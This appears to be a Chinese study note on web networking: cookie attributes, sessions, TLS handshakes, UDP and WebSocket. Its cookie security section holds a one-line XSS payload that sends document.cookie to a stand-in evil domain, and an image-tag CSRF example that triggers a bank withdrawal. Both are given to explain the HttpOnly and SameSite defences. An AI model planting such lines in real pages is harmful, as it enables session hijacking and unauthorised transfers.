Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向**同一服务器**再发起请求时被携带并发送到服务器上。

Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

#### ✔ Domain

`Domain` 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。**如果指定了 Domain，则一般包含子域名（子域名可以访问父域名的 Cookie）**。

例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如 `developer.mozilla.org`）。

#### ✔ Path

Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `%x2F` (`/`) 作为路径分隔符，子路径也会被匹配。

设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

#### ✔ Expires/Max-Age

Cookie 的过期时间，过了这个时间之后 Cookie 将会自动删除。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

`Max-Age` 的单位是秒。

```javascript
document.cookie = 'promo_shown=1; Max-Age=2600000; Secure'
```

#### ✔ HttpOnly

为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 `Document.cookie` API 无法访问带有 `HttpOnly` 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 `HttpOnly` 标记。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

#### ✔ Secure

标记为 `Secure` 的 Cookie 只应通过**被 HTTPS 协议加密**过的请求发送给服务端。

#### ✔ SameSite

ref

- [https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html](https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html)
- [https://www.zhihu.com/question/373011996/answer/1027939207](https://www.zhihu.com/question/373011996/answer/1027939207)

`SameSite` Cookie 允许服务器要求某个 Cookie 在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。

```http
Set-Cookie: key=value; SameSite=Strict
```

- `None` 浏览器会在同站请求、跨站请求下继续发送 Cookies，不区分大小写；
- `Strict` 浏览器将只发送相同站点请求的 Cookie(即当前网页 URL 与请求目标 URL 完全一致)。如果请求来自与当前 location 的 URL 不同的 URL，则不包括标记为 Strict 属性的 Cookie；
- `Lax` 在新版本浏览器中，为**默认**选项，Same-site Cookies 将会为一些跨站子请求保留，如**图片加载**或者 **iframe** 不会发送，而点击 `<a>` 标签会发送；

| 请求类型  | 示例                                 | 正常情况    | Lax         |
| :-------- | :----------------------------------- | :---------- | :---------- |
| 链接      | `<a href="..."></a>`                 | 发送 Cookie | 发送 Cookie |
| 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
| GET 表单  | `<form method="GET" action="...">`   | 发送 Cookie | 发送 Cookie |
| POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
| iframe    | `<iframe src="..."></iframe>`        | 发送 Cookie | 不发送      |
| AJAX      | `$.get("...")`                       | 发送 Cookie | 不发送      |
| Image     | `<img src="...">`                    | 发送 Cookie | 不发送      |

#### ✔ 增删改查

ref

- [https://www.w3school.com.cn/js/js_cookies.asp](https://www.w3school.com.cn/js/js_cookies.asp)

设置 Cookie 和修改 Cookie 相同：

```javascript
function setCookie(cname, cvalue, exdays) {
  const d = new Date()
  d.setTime(d.getTime() + exdays * 24 * 60 * 60 * 1000)
  const expires = 'expires=' + d.toUTCString()
  return (document.cookie = cname + '=' + cvalue + ';' + expires + ';path=/')
}
```

删除 Cookie：

```javascript
function deleteCookie(cname) {
  const d = new Date()
  const expires = 'expires=' + d.toUTCString()
  return (document.cookie = cname + '=;' + expires + ';path=/')
}
```

查询 Cookie：

```javascript
function getCookie(cname) {
  const cookieObj = document.cookie.split(';').reduce((prev, curr) => {
    const entry = curr.split('=')
    prev[entry[0].trim()] = entry[1]
    return prev
  }, {})
  if (cname) return cookieObj[cname]
  return cookieObj
}
```

#### ✔ 不同二级域名共享 Cookie

Cookie 可以设置成给子域名共享，类似于在 `x.com.cn` 设置的 Cookie 可以提供给 `a.x.com.cn`、`b.x.com.cn`、`suba.a.x.com.cn` 等域名访问。

比如下面的方式：

```javascript
res.writeHead(200, {
  'Set-Cookie': ['name=sub-x-com-cn; path=/;domain=x.com.cn', 'name=only-x-com-cn; path=/'],
})
```

`domain=x.com.cn` 表示 `domain=x.com.cn` 及其子域名都可以使用， 不写 `doamin` 默认只有当前域名可用，设置的 Cookie 是这样的：

![x.com.cn](https://qiniu1.lxfriday.xyz/feoffer/c2441eaf-79f0-9fa0-9b9a-b5203225c6f6.png)

![subx.x.com.cn](https://qiniu1.lxfriday.xyz/feoffer/c536421c-b7b0-a728-47e0-dc75289d3b93.png)

---

**总结**

1. 设置 Cookie 时，在 `x.com.cn` 设置为 `...;domain=x.com.cn` 的 Cookie 可以给 `x.com.cn` 及其子域名使用；
1. 设置 Cookie 时，在 `x.com.cn` 设置没有 `domain` 的 Cookie 只能给 `x.com.cn` 使用；
1. **父域名无法在子域名设置 Cookie**，例如在 `x.com.cn` 设置了 `name=lxfriday;domain=subx.x.com.cn`，这种设置是无效的；

#### ✔ Cookie 常见问题

1. Cookie 不区分端口；
1. 一个 Cookie 存储上限是 4K 大小；
1. Cookie 只能存储 ASCII 字符串；

#### ✔ Cookie 安全-会话劫持和 XSS

```javascript
new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie
```

`HttpOnly` 类型的 Cookie 由于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。

#### ✔ Cookie 安全-跨站请求伪造（CSRF）

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
```

当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。

这种情况只是一种假设，实际上应该不允许使用 GET 修改数据，对转账的操作需要添加二次确认。

### ✔ Session

Session 机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。

当程序需要为某个客户端的请求创建一个 Session 时，服务器首先检查这个客户端的请求里是否已包含了一个 Session 标识（称为 Session ID），如果已包含则说明以前已经为此客户端创建过 Session，服务器就按照 Session ID 把这个 Session 检索出来使用（检索不到，会新建一个），如果客户端请求不包含 Session ID，则为此客户端创建一个 Session 并且生成一个与此 Session 相关联的 Session ID，Session ID 的值应该是一个**既不会重复，又不容易被找到规律以仿造的字符串**，这个 Session ID 将被在本次响应中返回给客户端保存。

Session 从客户端传输到服务端的方式有两种：

1. 通过 Cookie 传输；
1. 通过 URL 传输；
1. 表单隐藏字段，通过在 `<form>` 中添加一个隐藏字段，把 Session 传回服务器；

基于 Cookie 实现，会话期 Cookie 是最简单的 Cookie：**浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效**。会话期 Cookie 不需要指定过期时间（`Expires`）或者有效期（`Max-Age`）。

```http
Set-Cookie: name=lxfriday.xyz; path=/; HttpOnly
```

![Session in Chrome](https://qiniu1.lxfriday.xyz/feoffer/67c6ab54-6de6-a5b4-fdd2-a1028587c7be.png)

#### ✔ Cookie 与 Session 有什么不同

ref

- [Cookie 与 Session 的区别-总结很好的文章](https://mp.weixin.qq.com/s?__biz=MzA4MjA0MTc4NQ==&mid=504090000&idx=3&sn=f57d4f194c902daadd80296d5b8ed001#rd)

1. **保存的地方不同**，Cookie 保存在客户端，Session 保存在服务端；
1. **有效期不同**，Cookie 可以存储很长时间，Session 只能存在于一次会话中，浏览器关闭之后 Session 就失效了；
1. **安全性不同**，Cookie 存储在客户端容易被盗取或者利用，Session 在服务端比较安全；
1. **存储大小不同**，单个 Cookie 能存储 4K 的数据，Session 存储量比 Cookie 高得多；
1. **存取方式不同**，Cookie 中只能保存 **ASCII 字符串**，假如需求存取 Unicode 字符或者二进制数据，需求先进行编码。Session 中能够存取**任何类型**的数据；
1. **服务器压力不同**，Session 是存储在服务端的，巨大并发的时候会使服务器资源急速飙升。Cookie 则不存在此问题；

## ✔ HTTPS

### ✔ 对称加密

![](https://qiniu1.lxfriday.xyz/feoffer/3cd066a3-d0f0-03cb-253a-7ee41b1a5b40.png)

**对称加密**是指加密和解密时使用的密钥都是同一个，是**对称**的，只要保证了密钥的安全，那整个通信过程就可以说具有了机密性。

TLS 里有非常多的对称加密算法可供选择，比如 RC4、DES、3DES、AES、ChaCha20 等，但前三种算法都被认为是不安全的，通常都禁止使用，目前常用的只有 **AES** 和 **ChaCha20**。

**AES** 的意思是**高级加密标准**（Advanced Encryption Standard），密钥长度可以是 128、192 或 256。它是 DES 算法的替代者，安全强度很高，性能也很好，而且有的硬件还会做特殊优化，所以非常流行，是应用最广泛的对称加密算法。

**ChaCha20** 是 Google 设计的另一种加密算法，密钥长度固定为 256 位，纯软件运行性能要超过 AES，曾经在移动客户端上比较流行，但 ARMv8 之后也加入了 AES 硬件优化，所以现在不再具有明显的优势，但仍然算得上是一个不错算法。

#### ✔ 加密分组模式

对称算法还有一个**分组模式**的概念，它可以让算法用**固定长度的密钥**加密任意长度的明文，把**小秘密（即密钥）**转化为**大秘密（即密文）**。

最新的分组模式被称为 **AEAD**（Authenticated Encryption withAssociated Data），在**加密**的同时增加了**认证**的功能，常用的是 **GCM（伽罗瓦/计数器模式）**、**CCM** 和**Poly1305**。

- AES128-GCM，意思是密钥长度为 128 位的 AES 算法，使用的分组模式是 GCM；
- ChaCha20-Poly1305 的意思是 ChaCha20 算法，使用的分组模式是 Poly1305；

另外也有下面一些分组模式：

- 电子密码本（ECB）
- 密码块链接（CBC）
- 填充密码块链接（PCBC）
- 密文反馈（CFB）
- 输出反馈（OFB）
- 计数器模式（CTR）

### ✔ 非对称加密

它有两个密钥，一个叫**公钥**（public key），一个叫**私钥**（private key）。两个密钥是不同的，**不对称**，公钥可以公开给任何人使用，而私钥必须严格保密。

公钥和私钥有个特别的**单向**性，虽然都可以用来加密解密，但公钥加密后只能用私钥解密，反过来，私钥加密后也只能用公钥解密。

非对称加密可以解决**密钥交换**的问题。网站秘密保管私钥，在网上任意分发公钥，你想要登录网站只要用公钥加密就行了，密文只能由私钥持有者才能解密。而黑客因为没有私钥，所以就无法破解密文。

非对称加密算法的设计要比对称算法难得多，在 TLS 里只有很少的几种，比如 `DH`、`DSA`、`RSA`、`ECC` 等。

**`RSA`**

RSA 是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。**RSA 就是他们三人姓氏开头字母拼在一起组成的**；

对极大整数做因数分解的难度决定了 RSA 算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的 RSA 钥匙才可能被强力方式解破。世界上还没有任何可靠的攻击 RSA 算法的方式。只要其钥匙的长度足够长，用 RSA 加密的信息实际上是不能被解破的。**目前 RSA 密钥的推荐长度是 2048**；

**ECC**

ECC（Elliptic Curve Cryptography）是非对称加密里的后起之秀，它基于椭圆曲线离散对数的数学难题，使用特定的曲线方程和基点生成公钥和私钥，**子算法 ECDHE 用于密钥交换，ECDSA 用于数字签名**。

### ✔ 混合加密

ref

- [透视 HTTP 协议：24 讲](https://time.geekbang.org/column/intro/100029001)

非对称加密有很高的安全性，但是它的成本也非常高，如果只用非对称加密可能会导致很严重的性能问题。

```
aes_128_cbc enc/dec 1000 times : 0.97ms, 13.11MB/s
rsa_1024 enc/dec 1000 times : 138.59ms, 93.80KB/s
rsa_1024/aes ratio = 143.17
rsa_2048 enc/dec 1000 times : 840.35ms, 15.47KB/s
rsa_2048/aes ratio = 868.13
```

TLS 在设计的时候考虑到了对称加密和非对称加密各自的优点，采用混合加密来实现。

1. 在通信刚开始的时候使用非对称算法，比如 `RSA`、`ECDHE`，首先解决密钥交换的问题；
1. 然后用随机数产生对称算法使用的**会话密钥**（session key），再用公钥加密。因为会话密钥很短，通常只有 16 字节或 32 字节，所以慢一点也无所谓。

### ✔ 数字证书和 CA

CA（Certificate Authority，证书认证机构），具有极高的可信度，由它来给各个公钥签名，用自身的信誉来保证公钥无法伪造，是可信的。

知名的 CA 全世界就那么几家，比如 DigiCert、VeriSign、Entrust、Let’s Encrypt 等，它们签发的证书分 DV、OV、EV 三种，区别在于可信程度。

- `DV` 中文全称是**域名验证型证书**，证书审核方式为通过**验证域名所有权**即可签发证书。此类型证书适合个人和小微企业申请，价格较低，申请快捷，但是证书中无法显示企业信息，安全性较差。在浏览器中显示锁型标志；
- `OV` **企业验证型证书**，证书审核方式为**通过验证域名所有权和申请企业的真实身份信息才能签发证书**。目前 OV 类型证书是全球运用最广，兼容性最好的证书类型。此证书类型适合中型企业和互联网业务申请。在浏览器中显示锁型标志，并能通过点击查看到企业相关信息。支持 ECC 高安全强度加密算法，加密数据更加安全，加密性能更高；
- `EV` **增强验证型证书**，证书审核级别为所有类型最严格验证方式，在 OV 类型的验证基础上额外验证其他企业的相关信息，比如银行开户许可证书。EV 类型证书多使用于银行,金融,证券,支付等高安全标准行业。其在地址栏可以显示独特的 EV 绿色标识地址栏，最大程度的标识出网站的可信级别。支持 ECC 高安全强度加密算法，加密数据更加安全，加密性能更高；

证书体系（PKI，Public Key Infrastructure）虽然是目前整个网络世界的安全基础设施，但它也不是完全没有弱点的。如果 CA 失误或者被欺骗，签发了错误的证书，虽然证书是真的，可它代表的网站却是假的。针对这种情况，开发出了 **CRL**（证书吊销列表，Certificate revocation list）和 **OCSP**（在线
证书状态协议，Online Certificate Status Protocol），及时废止有问题的证书。

还有一种更危险的情况，CA 被黑客攻陷，或者 CA 有恶意，因为它（即根证书）是信任的源头，整个信任链里的所有证书也就都不可信了。因为涉及的证书太多，就**只能操作系统或者浏览器从根上下手了，撤销对 CA 的信任，列入黑名单**，这样它颁发的所有证书就都会被认为是不安全的。

### ✔ HTTPS 概述

![](https://qiniu1.lxfriday.xyz/feoffer/e2153928-d0b6-e997-5ae4-21c2dcb08b38.png)

HTTPS => HTTP over SSL/TLS，让 HTTP 运行在了安全的 SSL/TLS 协议上。

SSL 发展到 v3 时已经证明了它自身是一个非常好的安全通信协议，TLS1.0 实际上就是 SSLv3.1。 TLS 已经发展出了三个版本，分别是 2006 年的 1.1、2008 年的 1.2 和 2018 年的 1.3。目前应用的最广泛的 TLS 是 1.2。TLS 由**记录协议**、**握手协议**、**警告协议**、**变更密码规范协议**、**扩展协议**等几个子协议组成，综合使用了**对称加密**、**非对称加密**、**身份认证**等许多密码学前沿技术。

### ✔ SSL

传输层安全性协议（英语：Transport Layer Security，缩写：**TLS**）及其前身安全套接层（英语：Secure Sockets Layer，缩写：**SSL**）是一种安全协议，目的是为互联网通信提供安全及数据完整性保障。

![](https://qiniu1.lxfriday.xyz/feoffer/27c3b193-63ec-6c2f-0bd6-80d278ce280b.png)

**SSL 1.0、2.0 和 3.0**

SSL（Secure Sockets Layer）是网景公司（Netscape）设计的主要用于 Web 的安全传输协议，这种协议在 Web 上获得了广泛的应用。

基础算法由作为网景公司的首席科学家塔希尔·盖莫尔（Taher Elgamal）编写，所以他被人称为“SSL 之父”。

- 1.0 版本从未公开过，因为存在严重的安全漏洞；
- 2.0 版本在 1995 年 2 月发布，但因为存在数个严重的安全漏洞而被 3.0 版本替代；
- 3.0 版本在 1996 年发布，是由网景工程师 Paul Kocher、Phil Karlton 和 Alan Freier 完全重新设计的。较新版本的 SSL/TLS 基于 SSL 3.0。SSL 3.0 作为历史文献 IETF 通过 RFC 6101 发表；

### ✔ TLS

**TLS 1.0**

IETF 将 SSL 标准化，即 RFC 2246 ，并将其称为 **TLS**（Transport Layer Security）。从技术上讲，**TLS 1.0 与 SSL 3.0 的差异非常微小**。但正如 RFC 所述 "the differences between this protocol and SSL 3.0 are not dramatic, but they are significant enough to preclude interoperability between TLS 1.0 and SSL 3.0"（本协议和 SSL 3.0 之间的差异并不是显著，却足以排除 TLS 1.0 和 SSL 3.0 之间的互操作性）。TLS 1.0 包括可以降级到 SSL 3.0 的实现，这削弱了连接的安全性。

**TLS 1.1**

TLS 1.1 在 RFC 4346 中定义，于 2006 年 4 月发表，它是 TLS 1.0 的更新；

**TLS 1.2**

TLS 1.2 在 RFC 5246 中定义，于 2008 年 8 月发表。它基于更早的 TLS 1.1 规范。主流浏览器都已经实现了 TLS 1.2 的支持。

**TLS 1.3**

TLS 1.3 在 RFC 8446 中定义，于 2018 年 8 月发表。它基于更早的 TLS 1.2 规范。

### ✔ TLS 协议的组成

TLS 包含几个子协议，比较常用的有**记录协议**、**警报协议**、**握手协议**、**变更密码规范协议**。

**记录协议**

记录协议（Record Protocol）规定了 TLS 收发数据的基本单位：记录（record）。它有点像是 TCP 里的 segment，所有的其他子协议都需要通过记录协议发出。但多个记录数据可以在一个 TCP 包里一次性发出，也并不需要像 TCP 那样返回 ACK。

**警报协议**

警报协议（Alert Protocol）的职责是向对方发出警报信息，有点像是 HTTP 协议里的状态码。比如，`protocol_version` 就是不支持旧版本，`bad_certificate` 就是证书有问题，收到警报后另一方可以选择继续，也可以立即终止连接。

**握手协议**

握手协议（Handshake Protocol）是 TLS 里最复杂的子协议，要比 TCP 的 SYN/ACK 复杂的多，浏览器和服务器会在握手过程中协商 **TLS 版本号**、**随机数**、**密码套件**等信息，然后**交换证书**和**密钥参数**，最终双方协商得到会话密钥，用于后续的混合加密系统。

**变更密码规范协议**

它非常简单，就是一个“通知”，告诉对方，后续的数据都将使用加密保护。那么反过来，在它之前，数据都是明文的。

### ✔ HTTPS 建立连接的过程（ECDHE 握手）

ref

- [HTTPS 篇之 SSL 握手过程详解](https://razeencheng.com/post/ssl-handshake-detail)

![](https://qiniu1.lxfriday.xyz/feoffer/dba6f32a-f007-637a-4c7e-347fc9a45014.png)

客户端与服务器用相同的算法根据客户端随机数，服务器随机数，预主秘钥生产主密钥，之后的通信内容将都用主密钥加密解密。

**1、客户端发出请求（ClientHello）**

- 支持的协议版本，比如 TLS 1.2 版；
- 一个客户端生成的随机数，稍后用于生成**对话密钥**；
- 支持的加密套件列表（Cipher Suites：TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384、TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256）；
- 支持的压缩方法（Compression Methods）；
- 扩展列表（Extensions）；

![](https://qiniu1.lxfriday.xyz/feoffer/6580f624-daa0-ae61-237c-b7b65bb9d38c.png)

**2、服务器回应（SeverHello）**

- 确认使用的加密通信协议版本，比如 TLS 1.2 版本，如果浏览器与服务器支持的版本不一致，服务器关闭加密通信；
- 一个服务器生成的随机数，稍后用于生成**对话密钥**；
- 确认使用的加密套件（如 TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256）；
- 压缩方法；
- 扩展列表；
- 服务器证书（Certificate）；
- Server Key Exchange（ECDHE 特色）：其中包含椭圆曲线的公钥（Server Params），用来实现密钥交换算法；

![](https://qiniu1.lxfriday.xyz/feoffer/dd737f55-c4b8-0aa9-d895-9d0737d85ba3.png)

![](https://qiniu1.lxfriday.xyz/feoffer/dfe8aa7e-9db6-9af3-c037-d6b74a549967.png)

**3、客户端回应**

客户端收到服务器回应以后，**首先验证服务器证书**。如果证书**不是可信机构颁布**、或者**证书中的域名与实际域名不一致**、或者**证书已经过期**，就会向访问者显示一个警告，由其选择是否还要继续通信。

- 客户端按照密码套件的要求，也生成一个椭圆曲线的公钥（Client Params），用 Client Key Exchange 消息发送给服务器（EC Diffie-Hellman Client Params->Pubkey）；
- 编码改变通知（Change Cipher Spec），表示随后的信息都将用双方商定的加密方法和密钥发送；
- 客户端握手结束通知（Encrypted Handshake Message），表示客户端的握手阶段已经结束；

![](https://qiniu1.lxfriday.xyz/feoffer/365fa28b-89f1-0a35-4e63-e43c8ae4064d.png)

**4、服务器的最后回应**

服务器收到客户端的第三个随机数 pre-master key 之后，计算生成本次会话所用的"会话密钥"。然后，向客户端最后发送下面信息。

- 编码改变通知（Change Cipher Spec），表示随后的信息都将用双方商定的加密方法和密钥发送；
- 服务器握手结束通知（Encrypted Handshake Message），表示服务器的握手阶段已经结束；

这一步之后客户端和服务器手里都拿到了密钥交换算法的两个参数（Client Params、Server Params），就用 ECDHE 算法一阵算，算出了一个新的东西，叫**Pre-Master**，其实也是一个**随机数**。

现在客户端和服务器手里有了三个随机数：Client Random、Server Random 和 Pre-Master。用这三个作为原始材料，就可以生成**用于加密会话的主密钥**，叫**MasterSecret**。而黑客因为拿不到**Pre-Master**，所以也就得不到主密钥。

**为什么非要三个随机数呢？**，他们不信任客户端或服务器伪随机数的可靠性，为了保证真正的完全随机不可预测，把三个不可靠的随机数混合起来，那么随机的程度就非常高了，足够让黑客难以猜测。

Master Secret 生成的公式：

```
master_secret = PRF(pre_master_secret, "master secret", ClientHello.random + ServerHello.random)
```

PRF 就是伪随机数函数，它基于密码套件里的最后一个参数，比如这次的 SHA256，通过摘要算法来再一次强化 Master Secret 的随机性。

**主密钥有 48 字节，但它也不是最终用于通信的会话密钥，还会再用 PRF 扩展出更多的密钥，比如客户端发送用的会话密钥（client_write_key）、服务器发送用的会话密钥（server_write_key）等等，避免只用一个密钥带来的安全隐患。**

![](https://qiniu1.lxfriday.xyz/feoffer/24abb128-4245-8f37-4c8e-d9e02c390914.png)

建立好连接之后双方开始发送数据，抓包看到的数据都是加密的。

![](https://qiniu1.lxfriday.xyz/feoffer/d307bd74-c096-8d2f-3b79-28f43acf19cc.png)

---

因为使用了 ECDHE，客户端可以不用等到服务器发回**Finished**确认握手完毕，立即就发出 HTTP 报文，省去了一个消息往返的时间浪费。这个叫**TLS FalseStart**，意思就是**抢跑**，和**TCP Fast Open**有点像，都是不等连接完全建立就提前发应用数据，提高传输的效率。

### ✔ HTTPS 建立连接的过程（RSA 握手）

ref

- [阮一峰：SSL/TLS 协议运行机制的概述](https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html)

RSA HTTPS 握手主要是在第二阶段和第三阶段有不同。第二阶段服务端不用发送椭圆曲线公钥和签名，在第三阶段客户端生成 Pre master key 之后用证书加密（Client Key Exchange），发送给服务端，服务端使用这个 pre master key 以及前面两次的随机数来生成主密钥。

大体的流程没有变，只是**Pre-Master**不再需要用算法生成，而是客户端直接生成随机数，然后用服务器的公钥加密，通过**Client Key Exchange**消息发给服务器。服务器再用私钥解密，这样双方也实现了共享三个随机数，就可以生成主密钥。

### ✔ HTTPS 建立连接时抓包字段详解

ref

- [HTTPS 篇之 SSL 握手过程详解](https://razeencheng.com/post/ssl-handshake-detail)

**Content Type**

消息的内容类型，告诉服务器，我要握手了。

**Version**

​ 协议版本（protocol version) 告诉服务器 客户端支持的最佳协议版本。

**Random**

​ 随机数，也就是流程图中的客户端随机数。包含 32 字节的数据，其中 28 字节是随机生成的(Random Bytes)。剩下的 4 字节包含额外的信息(GMT Unix Time)，受客户端时钟影响（一般浏览器会给他们的时间添加时钟扭曲，或者简单的发送随机 4 字节）。在握手的时候这随机数都是独一无二的，他们在身份验证中起到举足轻重的作用（可以防止重复攻击，并确认初始数据交换的完整性）。

**Session ID**

在第一连接时，会话 ID(Session ID)字段是空的，这表示客户端告诉服务器 我是新会话，没有其他会话需要恢复。在后续的连接中，这个字段可以保存会话的唯一标识。服务器可以借助会话 ID 在自己的缓存中找到对应的会话状态。

**Cipher Suites**

​ 密码套件块是由客户端支持的所有密码套件组成的列表，该列表是按优先级顺序排列的。

密码套件(cipher suite)是一组选定的加密基元和其他参数，它可以精确定义如何实现安全。套件大致由以下这些属性定义。

- 身份验证方法
- 密钥交换方法
- 加密算法
- 加密密钥大小
- 密码模式（可应用时）
- MAC 算法（可应用时）
- PRF（只有 TLS1.2 一定使用，其他版本取决于各自协议）
- 用于 Finished 消息的散列函数（TLS1.2）
- verify_data 结构的长度（TLS1.2)

![](https://qiniu1.lxfriday.xyz/feoffer/cf24b20d-6d49-7255-1196-2ddb7d50e768.png)

![](https://qiniu1.lxfriday.xyz/feoffer/4612e504-9cdc-620e-050e-5593cde51c5e.png)

**Compression**

客户端可以提交一个或多个支持的压缩方法。默认是 null，代表没有压缩。

**Extensions**

​ 扩展块由任意数量的扩展组成。这些扩展会携带额外的数据。扩展可以在不修改协议本身的条件下为 TLS 协议增加功能。

## ✔ UDP

**用户数据报协议**（英语：**User Datagram Protocol**，缩写：**UDP**；又称用户数据包协议）是一个简单的面向数据报的通信协议，位于 OSI 模型的传输层。该协议由 David P. Reed 在 1980 年设计且在 RFC 768 中被规范。典型网络上的众多使用 UDP 协议的关键应用在一定程度上是相似的。

UDP 只提供数据的不可靠传递，它一旦把应用程序发给网络层的数据发送出去，就不保留数据备份（所以 UDP 有时候也被认为是不可靠的数据报协议）。UDP 在 IP 数据报的头部仅仅加入了复用和数据校验字段。

**UDP 适用于不需要在程序中执行错误检查和纠正的应用**，它避免了协议栈中此类处理的开销。对时间有较高要求的应用程序通常使用 UDP，因为丢弃数据包比等待或重传导致延迟更可取。

**UDP 的构成**

![](https://qiniu1.lxfriday.xyz/feoffer/0f546736-a1e3-d1ad-3450-42be69c69598.png)

UDP 头部包含了以下几个数据：

- 两个十六位的端口号，分别为源端口（可选字段）和目标端口；
- 整个数据报文的长度；
- 整个数据报文的检验和（IPv4 可选 字段），该字段用于发现头部信息和数据中的错误；

**可靠性**

由于 UDP **缺乏可靠性**且**属于无连接协议**，所以应用程序通常必须容许一些丢失、错误或重复的数据包。某些应用程序（如 TFTP）可能会根据需要在应用程序层中添加基本的可靠性机制。

一些应用程序不太需要可靠性机制，甚至可能因为引入可靠性机制而降低性能，所以它们使用 UDP 这种缺乏可靠性的协议。流媒体，实时多人游戏和 IP 语音（VoIP）是经常使用 UDP 的应用程序。 在这些特定应用中，丢包通常不是重大问题。如果应用程序需要高度可靠性，则可以使用诸如 TCP 之类的协议。

由于 UDP 缺乏拥塞控制，所以需要基于网络的机制来减少因失控和高速 UDP 流量负荷而导致的拥塞崩溃效应。因为 UDP 发送端无法检测拥塞，所以像使用包队列和丢弃技术的路由器之类的网络基础设备会被用于降低 UDP 过大流量。[数据拥塞控制协议](https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE)（DCCP）设计成通过在诸如流媒体类型的高速率 UDP 流中增加主机拥塞控制，来减小这个潜在的问题。

### ✔ UDP 应用

- [DNS](https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F) 域名系统，其中查询阶段必须快速，并且只包含单个请求，后跟单个回复数据包；
- [DHCP](https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AE) 动态主机配置协议，用于动态分配 IP 地址；
- [SNMP](https://zh.wikipedia.org/wiki/%E7%AE%80%E5%8D%95%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%8D%8F%E8%AE%AE) 简单网络管理协议；
- [RIP](https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE) 路由信息协议；
- [NTP](https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E6%99%82%E9%96%93%E5%8D%94%E5%AE%9A) 网络时间协议；

音频、视频、在线游戏流量通常使用 UDP 传输。 实时视频流和音频流应用程序旨在处理偶尔丢失、错误的数据包，因此只会发生质量轻微下降，而避免了重传数据包带来的高延迟。

## ✔ WebSocket

ref

- [维基百科 WebSocket](https://zh.wikipedia.org/wiki/WebSocket)
- [MDN websocket](https://developer.mozilla.org/zh-CN/docs/Web/API/WebSocket/WebSocket)
- [npm ws](https://www.npmjs.com/package/ws)

![](https://qiniu1.lxfriday.xyz/feoffer/acdfd5e9-d7c2-6b9c-2415-caf38329ff85.png)

WebSockets 是一种网络传输协议，可在单个 TCP 连接上进行全双工通信，位于 OSI 模型的应用层。它可以在用户的浏览器和服务器之间打开交互式通信会话。使用此 API，您可以**向服务器发送消息并接收事件驱动的响应**，而**无需通过轮询服务器**的方式以获得响应。

WebSocket 是一种与 HTTP 不同的协议。两者都位于 OSI 模型的应用层，并且都依赖于传输层的 TCP 协议。RFC 6455 中规定：it is designed to work over HTTP ports 80 and 443 as well as to support HTTP proxies and intermediaries（WebSocket 通过 HTTP 端口 80 和 443 进行工作，并支持 HTTP 代理和中介），从而使其与 **HTTP 协议兼容**。 为了实现兼容性，**WebSocket 握手使用 HTTP Upgrade 头从 HTTP 协议更改为 WebSocket 协议**。

Websocket 使用 ws 或 wss 的统一资源标志符（URI）。其中 wss 表示使用了 TLS 的 Websocket。如：

```
ws://example.com/wsapi
wss://secure.example.com/wsapi
```

Websocket 与 HTTP 和 HTTPS 使用相同的 TCP 端口，可以绕过大多数防火墙的限制。默认情况下，Websocket 协议使用 80 端口；运行在 TLS 之上时，默认使用 443 端口。

### ✔ WebSocket 优点

- 是轮询技术的替代，不会向服务器发送大量请求导致服务器压力，，也不会像 HTTP 请求一样带有较长的头信息；
- 节省服务器带宽和资源，能够更实时地进行通讯；
- 全双工，服务器可以随时主动给客户端下发数据；
- 保持连接状态，与 HTTP 不同的是，Websocket 需要先创建连接，这就使得其成为一种**有状态的协议**，之后通信时可以省略部分状态信息；
- 更好的二进制支持；
